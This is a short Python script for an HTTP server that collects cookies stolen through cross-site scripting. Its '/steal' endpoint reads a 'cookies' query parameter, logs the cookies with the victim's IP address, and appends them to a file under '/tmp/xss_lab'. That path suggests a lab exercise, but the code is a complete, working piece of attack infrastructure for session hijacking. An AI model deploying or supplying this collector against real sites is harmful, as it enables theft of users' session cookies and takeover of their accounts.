#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
from datetime import datetime

class CookieHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/steal'):
            # Parse the stolen cookies
            parsed_url = urllib.parse.urlparse(self.path)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            if 'cookies' in query_params:
                cookies = query_params['cookies'][0]
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                print(f"\n[{timestamp}] COOKIES STOLEN:")
                print(f"Source IP: {self.client_address[0]}")
                print(f"Cookies: {cookies}")
                print("-" * 50)
                
                # Save to file
                with open('/tmp/xss_lab/stolen_cookies.txt', 'a') as f:
                    f.write(f"[{timestamp}] {self.client_address[0]}: {cookies}\n")
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            super().do_GET()

PORT = 8080
with socketserver.TCPServer(("", PORT), CookieHandler) as httpd:
    print(f"Cookie collection server running on port {PORT}")
    print("Waiting for stolen cookies...")
    httpd.serve_forever()
